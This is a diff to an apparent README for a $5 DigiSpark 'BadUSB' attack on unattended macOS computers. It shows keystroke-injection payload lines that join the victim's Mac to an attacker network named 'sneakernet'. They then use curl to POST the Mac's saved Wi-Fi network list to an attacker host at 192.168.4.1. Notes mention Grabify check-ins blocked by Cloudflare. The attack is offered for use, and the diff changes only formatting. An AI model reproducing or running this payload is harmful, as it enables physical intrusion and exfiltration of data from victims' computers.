@@ -12,7 +12,7 @@ This is a $5 attack that does a couple things:
 Attack goes: A victim leaves a MacOS computer unattended for 30 seconds. The attacker inserts a DigiSpark board loaded with an attack payload. The payload looks like this (with delays and single key strokes removed):
 
 
-  DigiKeyboard.print("networksetup -setairportnetwork en0 'sneakernet' 00000000"); 
+ * DigiKeyboard.print("networksetup -setairportnetwork en0 'sneakernet' 00000000"); 
   - We add the network "Sneakernet" to our trusted network list and connect to it.
   
   DigiKeyboard.print("curl -m 10 --silent --output /dev/null -X POST -H \"Content-Type: text/plain\" --data \"$(networksetup -listpreferredwirelessnetworks en0)\" 192.168.4.1 &");
@@ -30,6 +30,6 @@ Attack goes: A victim leaves a MacOS computer unattended for 30 seconds. The att
 Total run time is about 30 seconds, not including the few seconds the Digisparks waits for a sketch to upload.
 
 Notes: Grabify may go into "I'm under attack" mode and not allow checkin. Look for this line:
-<div class="cf-browser-verification cf-im-under-attack">
+div class="cf-browser-verification cf-im-under-attack"
   
  If you see it, then the IP address is being blocked by cloudflare.
